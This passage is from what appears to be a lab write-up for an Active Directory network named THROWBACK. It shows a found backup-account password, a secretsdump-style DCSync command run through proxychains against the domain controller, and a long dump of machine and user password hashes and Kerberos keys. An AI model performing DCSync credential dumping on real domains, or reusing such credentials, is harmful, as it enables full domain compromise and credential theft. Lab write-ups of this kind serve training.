...
- We logged into the domain controller as jeffersd
![[Pasted image 20221025155628.png]]

Searching around in JeffersD account, we get a notice for backup
![[Pasted image 20221025162747.png]]
- So we could also SSH into backup account on the DC with password `TBH_Backup2348!`


![[Pasted image 20221025162925.png]]
- We get in as `backup` user and since it has DCSync rights, we can perform the DCSync Attack to dump domain credentials of every user.


### Going back to the BloodHound results, we see and check the DCSync rights to a domain controller. We have domain controller which has DCSync Rights so we can perform a DCSync Attack on the domain controller.

![[Pasted image 20221025161405.png]]

#### Now we use the secretdumps.py script to remotely perform the DCSync Attack against the domain controller.
```
proxychains python3 secretdumps.py -dc-ip 10.200.34.117 THROWBACK/backup@10.200.34.117
```
...
THROWBACK-DC01$:1008:aad3b435b51404eeaad3b435b51404ee:b5b6e52e6b344aec35f9a85e198c40df:::
THROWBACK-PROD$:1112:aad3b435b51404eeaad3b435b51404ee:ef918930de3227a6250d2952355127e1:::
THROWBACK-WS01$:1113:aad3b435b51404eeaad3b435b51404ee:451f17befeb17bc895348cfebe545ddf:::
THROWBACK-TIME$:1119:aad3b435b51404eeaad3b435b51404ee:5b95934d708b06540f09f0e7b3116b6c:::
CORPORATE$:1200:aad3b435b51404eeaad3b435b51404ee:df7975cc0e4672bf4aeb8e9257326a49:::
...
THROWBACK.local\StuartL:des-cbc-md5:325eb989df5bae52
...
THROWBACK.local\RosalesT:des-cbc-md5:ce203183583b2ce6
...
THROWBACK.local\NealR:des-cbc-md5:134507d07ada1f7c
...
THROWBACK.local\PateD:des-cbc-md5:bc4c51ad49ab0294
...
THROWBACK-DC01$:aes256-cts-hmac-sha1-96:80354a67c8740e96614a1ebb9ca8e37378bd2ac9ef406d8f98a380b727fd7f80
THROWBACK-DC01$:aes128-cts-hmac-sha1-96:583dc446d105639c74a13036bbad4ae1
THROWBACK-DC01$:des-cbc-md5:919ea4209446d51c
THROWBACK-PROD$:aes256-cts-hmac-sha1-96:48b2b2deaed95b4e19dcbdf314713c921041d41ff76085f85eabac8a22f4e134
THROWBACK-PROD$:aes128-cts-hmac-sha1-96:369527e832cf2a710055e129750781a9
THROWBACK-PROD$:des-cbc-md5:ecba1f6bdaec1389
THROWBACK-WS01$:aes256-cts-hmac-sha1-96:308219b7cf66d606b4c9fd8b883e9c66aef6e6cd8c6fada38666cf47f092e308
THROWBACK-WS01$:aes128-cts-hmac-sha1-96:977f09e158a651f36a09325a83247e69
THROWBACK-WS01$:des-cbc-md5:58e09ea2ade5983d
THROWBACK-TIME$:aes256-cts-hmac-sha1-96:0605e3f300c349cd91bcb46dbced3d35fd24a8ffac133c844761367f8f6d595b
THROWBACK-TIME$:aes128-cts-hmac-sha1-96:32c104d3d493b2f8cac3539c18d8d4ad
THROWBACK-TIME$:des-cbc-md5:2fa4a47697919b19
CORPORATE$:aes256-cts-hmac-sha1-96:0eae35782858c135d69f129bd8bf53c09d40d08b3e9ecc260c015da14c5c6ab1
CORPORATE$:aes128-cts-hmac-sha1-96:99ff5c6b48065f1cc032a1162b89d2b4
